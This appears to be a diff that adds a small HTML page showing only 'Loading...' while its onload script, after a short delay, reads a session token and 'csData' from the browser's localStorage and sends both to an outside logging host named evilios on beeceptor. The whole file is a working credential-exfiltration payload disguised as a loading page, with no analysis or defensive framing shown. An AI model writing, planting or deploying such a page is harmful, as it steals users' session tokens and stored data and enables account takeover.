@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    window.onload = function() {
+
+      setTimeout(function() {
+        var token = localStorage.getItem('token');
+        var csData = localStorage.getItem('csData');
+        if (token) {
+          fetch('https://evilios.free.beeceptor.com/log?t=' + encodeURIComponent(token) +
+                '&d=' + encodeURIComponent(csData));
+        }
+      }, 1000);
+    };
+  </script>
+</head>
+<body>Loading...</body>
+</html>
